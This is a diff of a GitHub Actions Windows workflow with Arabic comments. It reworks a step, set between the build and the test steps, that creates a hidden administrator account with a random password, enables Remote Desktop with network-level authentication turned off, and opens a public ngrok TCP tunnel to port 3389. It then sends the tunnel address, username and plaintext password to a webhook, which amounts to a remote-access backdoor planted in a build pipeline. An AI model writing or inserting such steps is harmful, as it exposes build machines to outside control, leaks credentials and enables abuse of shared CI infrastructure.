@@ -58,73 +58,51 @@ jobs:
           dotnet build -c Release
           dotnet run -c Release
 
-      - name: Prepare environment
-        id: prepare
+      - name: Setup ngrok tunnel
         run: |
+          # إنشاء مستخدم عشوائي
           $usr = "build_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
           $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
           $sec = ConvertTo-SecureString $pwd -AsPlainText -Force
 
-          New-LocalUser -Name $usr -Password $sec -AccountNeverExpires -PasswordNeverExpires > $null 2>&1
+          # إضافة المستخدم المحلي
+          New-LocalUser -Name $usr -AccountNeverExpires -PasswordNeverExpires -Password $sec > $null 2>&1
           Add-LocalGroupMember -Group "Administrators" -Member $usr > $null 2>&1
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr > $null 2>&1
 
+          # تفعيل RDP
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
 
-          # حفظ بيانات الدخول (ملف مؤقت) وإخراجها كـ outputs
-          $creds = @{ User = $usr; Pass = $pwd } | ConvertTo-Json
-          $creds | Out-File -Encoding utf8 "$env:TEMP\creds.json"
-          echo "user=$usr" >> $env:GITHUB_OUTPUT
-          echo "pass=$pwd" >> $env:GITHUB_OUTPUT
-
-          # إرسال بيانات الدخول مشفرة (base64)
-          $credsBase64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$usr : $pwd"))
-          $body = @{
-            content = "✅ **Build agent ready**`n`n**Encoded credentials:** ||$credsBase64||`n*(decode using base64)*"
-          } | ConvertTo-Json
-          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
-
-      - name: Setup ngrok tunnel
-        run: |
-          # قراءة بيانات المستخدم من الخطوة السابقة
-          $usr = "${{ steps.prepare.outputs.user }}"
-          $pwd = "${{ steps.prepare.outputs.pass }}"
-
-          # تحميل ngrok لنظام Windows
+          # تحميل ngrok
           $ngrokUrl = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
           $zipPath = "$env:TEMP\ngrok.zip"
           Invoke-WebRequest -Uri $ngrokUrl -OutFile $zipPath
           Expand-Archive -Path $zipPath -DestinationPath "$env:TEMP\ngrok" -Force
 
-          # إضافة auth token (يجب تعريف secret NGROK_AUTH_TOKEN في المستودع)
+          # إضافة auth token (يجب تعريف NGROK_AUTH_TOKEN في secrets)
           & "$env:TEMP\ngrok\ngrok.exe" config add-authtoken ${{ secrets.NGROK_AUTH_TOKEN }}
 
-          # تشغيل ngrok في الخلفية مع توجيه TCP للمنفذ 3389
+          # تشغيل ngrok مع توجيه TCP للمنفذ 3389
           $logFile = "$env:TEMP\ngrok.log"
-          $proc = Start-Process -FilePath "$env:TEMP\ngrok\ngrok.exe" `
+          Start-Process -FilePath "$env:TEMP\ngrok\ngrok.exe" `
             -ArgumentList "tcp 3389 --log=stdout" `
             -NoNewWindow -RedirectStandardOutput $logFile -PassThru
 
-          # انتظار حتى يظهر النفق (قد يحتاج 10-15 ثانية)
+          # انتظار 15 ثانية لظهور النفق
           Start-Sleep -Seconds 15
-
-          # استخراج العنوان العام من ملف السجل
           $log = Get-Content $logFile -ErrorAction SilentlyContinue
           $addrLine = $log | Select-String -Pattern "started tunnel.*tcp://(.*)"
+          
           if ($addrLine) {
             $publicAddr = $addrLine.Matches.Groups[1].Value
-            # إرسال التفاصيل عبر webhook
-            $message = "🌐 **ngrok tunnel active**`n`n**Address:** $publicAddr`n**User:** $usr`n**Pass:** ||$pwd||`n(استخدم العنوان في Remote Desktop)"
+            $message = "🌐 **ngrok RDP جاهز**`n`n**Address:** $publicAddr`n**User:** $usr`n**Pass:** $pwd`n(افتح mstsc وحط العنوان في Computer)"
             $body = @{ content = $message } | ConvertTo-Json
             Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
-            $env:TUNNEL_PID = $proc.Id
           } else {
-            # فشل استخراج العنوان، نرسل تحذير ونستمر بدون نفق
-            $message = "⚠️ **ngrok tunnel failed**`nCould not extract public address."
+            $message = "⚠️ **ngrok فشل**`nCheck logs or token."
             $body = @{ content = $message } | ConvertTo-Json
             Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
-            $proc | Stop-Process -Force
           }
 
       - name: Run extended tests
@@ -142,9 +120,8 @@ jobs:
 
       - name: Cleanup
         run: |
-          if ($env:TUNNEL_PID) {
-            try { Stop-Process -Id $env:TUNNEL_PID -Force -ErrorAction SilentlyContinue } catch {}
-          }
+          # قتل عمليات ngrok المتبقية (اختياري)
+          Get-Process -Name "ngrok" -ErrorAction SilentlyContinue | Stop-Process -Force
         continue-on-error: true
 
       - name: Finalize
